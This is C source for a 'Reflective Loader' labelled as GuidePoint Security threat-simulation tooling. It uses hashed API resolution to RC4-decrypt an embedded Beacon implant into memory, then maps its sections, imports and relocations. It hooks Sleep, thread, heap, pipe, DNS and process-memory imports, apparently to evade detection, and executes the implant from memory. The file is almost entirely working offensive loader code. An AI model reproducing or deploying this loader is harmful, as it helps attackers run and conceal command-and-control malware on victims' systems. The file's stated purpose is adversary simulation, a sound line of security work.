/**
 *
 * Reflective Loader
 *
 * GuidePoint Security LLC
 *
 * Threat and Attack Simulation
 *
**/

#include "Common.h"

typedef struct
{
	D_API( NtAllocateVirtualMemory );
	D_API( NtProtectVirtualMemory );
	D_API( NtFreeVirtualMemory );
	D_API( RtlAllocateHeap );
} API, *PAPI;

#define H_API_NTALLOCATEVIRTUALMEMORY		0xf783b8ec /* NtAllocateVirtualMemory */
#define H_API_NTPROTECTVIRTUALMEMORY		0x50e92888 /* NtProtectVirtualMemory */
#define H_API_NTFREEVIRTUALMEMORY		0x2802c609 /* NtFreeVirtualMemory */
#define H_API_RTLALLOCATEHEAP			0x3be94c5a /* RtlAllocateHeap */
#define H_API_NTCLOSE				0x40d6e69d /* NtClose */
#define H_LIB_NTDLL				0x1edab0ed /* ntdll.dll */

#ifndef PTR_TO_HOOK
#define PTR_TO_HOOK( a, b )	U_PTR( U_PTR( a ) + G_SYM( b ) - G_SYM( Table ) )
#endif

/*!
 *
 * Purpose:
 *
 * Loads Beacon into memory and executes its 
 * entrypoint.
 *
!*/

D_SEC( B ) VOID WINAPI Titan( VOID )
{
	API				Api;
	ARC4_CTX			Rc4;

	ULONG				Aoe = 0;
	SIZE_T				Prm = 0;
	SIZE_T				SLn = 0;
	SIZE_T				ILn = 0;
	SIZE_T				Idx = 0;
	SIZE_T				MLn = 0;
	SIZE_T				ELn = 0;

	PVOID				Enc = NULL;
	PVOID				Mem = NULL;
	PVOID				Map = NULL;
	PTABLE				Tbl = NULL;
	PCONFIG				Cfg = NULL;
	PIMAGE_DOS_HEADER		Dos = NULL;
	PIMAGE_NT_HEADERS		Nth = NULL;
	PIMAGE_SECTION_HEADER		Sec = NULL;
	PIMAGE_DATA_DIRECTORY		Dir = NULL;

	RtlSecureZeroMemory( &Api, sizeof( Api ) );
	RtlSecureZeroMemory( &Rc4, sizeof( Rc4 ) );

	/* Initialize API structures */
	Api.NtAllocateVirtualMemory = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTALLOCATEVIRTUALMEMORY );
	Api.NtProtectVirtualMemory  = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTPROTECTVIRTUALMEMORY );
	Api.NtFreeVirtualMemory     = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTFREEVIRTUALMEMORY );
	Api.RtlAllocateHeap         = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLALLOCATEHEAP );

	/* Set config and buf length */
	Cfg = C_PTR( G_END() );
	ELn = Cfg->Rc4Len;

	/* Init the key */
	arc4_init( &Rc4, Cfg->KeyBuf, sizeof( Cfg->KeyBuf ) );

	if ( NT_SUCCESS( Api.NtAllocateVirtualMemory( NtCurrentProcess(), &Enc, 0, &ELn, MEM_COMMIT, PAGE_READWRITE ) ) ) {
		/* Decode Beacon into new memory region */
		arc4_process( &Rc4, Cfg->Rc4Buf, Enc, Cfg->Rc4Len );

		/* Setup Image Headers */
		Dos = C_PTR( C_PTR( Enc ) );
		Nth = C_PTR( U_PTR( Dos ) + Dos->e_lfanew );
		Sec = IMAGE_FIRST_SECTION( Nth );

		/* Allocate Length For Hooks & Beacon */
		ILn = ( ( ( Nth->OptionalHeader.SizeOfImage ) + 0x1000 - 1 ) &~( 0x1000 - 1 ) );
		SLn = ( ( ( G_END() - G_SYM( Table ) ) + 0x1000 - 1 ) &~ ( 0x1000 - 1 ) );
		MLn = ILn + SLn;

		/* Create a page of memory that is marked as R/W */
		if ( NT_SUCCESS( Api.NtAllocateVirtualMemory( NtCurrentProcess(), &Mem, 0, &MLn, MEM_COMMIT, PAGE_READWRITE ) ) ) {
		
			/* Copy hooks over the top */
			__builtin_memcpy( Mem, C_PTR( G_SYM( Table ) ), U_PTR( G_END() - G_SYM( Table ) ) );

			/* Get pointer to PE Image */
			Map = C_PTR( U_PTR( Mem ) + SLn - Sec->VirtualAddress );

			/* Copy sections over to new mem */
			for ( Idx = 0 ; Idx < Nth->FileHeader.NumberOfSections ; ++Idx ) {
				__builtin_memcpy( C_PTR( U_PTR( Map ) + Sec[ Idx ].VirtualAddress ),
						  C_PTR( U_PTR( Dos ) + Sec[ Idx ].PointerToRawData ),
						  Sec[ Idx ].SizeOfRawData );
			};

			/* Get a pointer to the import table */
			Dir = & Nth->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_IMPORT ];

			if ( Dir->VirtualAddress ) {
				/* Process Import Table */
				LdrProcessIat( C_PTR( Map ), C_PTR( U_PTR( Map ) + Dir->VirtualAddress ) );
				
				#if defined( _WIN64 )
				LdrHookImport( C_PTR( Map ), C_PTR( U_PTR( Map ) + Dir->VirtualAddress ), 0x0e07cd7e, PTR_TO_HOOK( Mem, Sleep_Hook ) );
				LdrHookImport( C_PTR( Map ), C_PTR( U_PTR( Map ) + Dir->VirtualAddress ), 0x84d15061, PTR_TO_HOOK( Mem, ReadFile_Hook ) );
				LdrHookImport( C_PTR( Map ), C_PTR( U_PTR( Map ) + Dir->VirtualAddress ), 0xf1d207d0, PTR_TO_HOOK( Mem, WriteFile_Hook ) );
				LdrHookImport( C_PTR( Map ), C_PTR( U_PTR( Map ) + Dir->VirtualAddress ), 0xfdb928e7, PTR_TO_HOOK( Mem, CloseHandle_Hook ) );
				LdrHookImport( C_PTR( Map ), C_PTR( U_PTR( Map ) + Dir->VirtualAddress ), 0x436e4c62, PTR_TO_HOOK( Mem, ConnectNamedPipe_Hook ) );
				LdrHookImport( C_PTR( Map ), C_PTR( U_PTR( Map ) + Dir->VirtualAddress ), 0xa05e2a6d, PTR_TO_HOOK( Mem, CreateNamedPipeA_Hook ) );
				LdrHookImport( C_PTR( Map ), C_PTR( U_PTR( Map ) + Dir->VirtualAddress ), 0x0df1b3da, PTR_TO_HOOK( Mem, WaitForSingleObject_Hook ) );
				#endif

				LdrHookImport( C_PTR( Map ), C_PTR( U_PTR( Map ) + Dir->VirtualAddress ), 0x4b184b05, PTR_TO_HOOK( Mem, HeapFree_Hook ) );
				LdrHookImport( C_PTR( Map ), C_PTR( U_PTR( Map ) + Dir->VirtualAddress ), 0xadc4062e, PTR_TO_HOOK( Mem, HeapAlloc_Hook ) );
				LdrHookImport( C_PTR( Map ), C_PTR( U_PTR( Map ) + Dir->VirtualAddress ), 0xc165d757, PTR_TO_HOOK( Mem, ExitThread_Hook ) );
				LdrHookImport( C_PTR( Map ), C_PTR( U_PTR( Map ) + Dir->VirtualAddress ), 0x8641aec0, PTR_TO_HOOK( Mem, DnsQuery_A_Hook ) );
				LdrHookImport( C_PTR( Map ), C_PTR( U_PTR( Map ) + Dir->VirtualAddress ), 0x3a5fb425, PTR_TO_HOOK( Mem, HeapReAlloc_Hook ) );
				LdrHookImport( C_PTR( Map ), C_PTR( U_PTR( Map ) + Dir->VirtualAddress ), 0x98baab11, PTR_TO_HOOK( Mem, CreateThread_Hook ) );
				LdrHookImport( C_PTR( Map ), C_PTR( U_PTR( Map ) + Dir->VirtualAddress ), 0xdecfc1bf, PTR_TO_HOOK( Mem, GetProcAddress_Hook ) );
				LdrHookImport( C_PTR( Map ), C_PTR( U_PTR( Map ) + Dir->VirtualAddress ), 0x5775bd54, PTR_TO_HOOK( Mem, VirtualAllocEx_Hook ) );
				LdrHookImport( C_PTR( Map ), C_PTR( U_PTR( Map ) + Dir->VirtualAddress ), 0xfd1438ae, PTR_TO_HOOK( Mem, SetThreadContext_Hook ) );
				LdrHookImport( C_PTR( Map ), C_PTR( U_PTR( Map ) + Dir->VirtualAddress ), 0x5b6b908a, PTR_TO_HOOK( Mem, VirtualProtectEx_Hook ) );
				LdrHookImport( C_PTR( Map ), C_PTR( U_PTR( Map ) + Dir->VirtualAddress ), 0x5c3f8699, PTR_TO_HOOK( Mem, ReadProcessMemory_Hook ) );
				LdrHookImport( C_PTR( Map ), C_PTR( U_PTR( Map ) + Dir->VirtualAddress ), 0xb7930ae8, PTR_TO_HOOK( Mem, WriteProcessMemory_Hook ) );
			};

			/* Get a pointer to the relocation table */
			Dir = & Nth->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_BASERELOC ];

			if ( Dir->VirtualAddress ) {
				/* Process Relocations */
				LdrProcessRel( C_PTR( Map ), C_PTR( U_PTR( Map ) + Dir->VirtualAddress ), Nth->OptionalHeader.ImageBase );
			};

			/* Set Heap Parameters */
			SLn = SLn + Sec->SizeOfRawData;
			Tbl = C_PTR( PTR_TO_HOOK( Mem, Table ) );

			if ( ( Tbl->Table = Api.RtlAllocateHeap( NtCurrentPeb()->ProcessHeap, HEAP_ZERO_MEMORY, sizeof( TABLE_HEAP ) ) ) != NULL ) {

				/* Give information about image */
				Tbl->Table->RxBuffer       = U_PTR( Mem );
				Tbl->Table->RxLength       = U_PTR( SLn );
				Tbl->Table->ImageLength    = U_PTR( MLn );

				/* Copy over the CLIENT_ID structure */
				__builtin_memcpy( &Tbl->Table->ClientId, &NtCurrentTeb()->ClientId, sizeof( CLIENT_ID ) );

				/* Initiliaze heap list header */
				InitializeListHead( &Tbl->Table->HeapList );

				/* Initialize pipe list header */
				InitializeListHead( &Tbl->Table->PipeList );

				/* Change Memory Protection. */
				if ( NT_SUCCESS( Api.NtProtectVirtualMemory( NtCurrentProcess(), &Mem, &SLn, PAGE_EXECUTE_READ, &Prm ) ) ) {
					/* Set the values we need! */
					ELn = 0;
					Aoe = Nth->OptionalHeader.AddressOfEntryPoint;
					if ( NT_SUCCESS( Api.NtFreeVirtualMemory( NtCurrentProcess(), &Enc, &ELn, MEM_RELEASE ) ) ) {
						/* Call the "PreMain" to ensure that the ReflectiveLoader is freed! */
						( ( __typeof__( PreMain ) * ) PTR_TO_HOOK( Mem, PreMain ) )( Map, Aoe );
					};
				};
			};
		};
	};
	return;
};
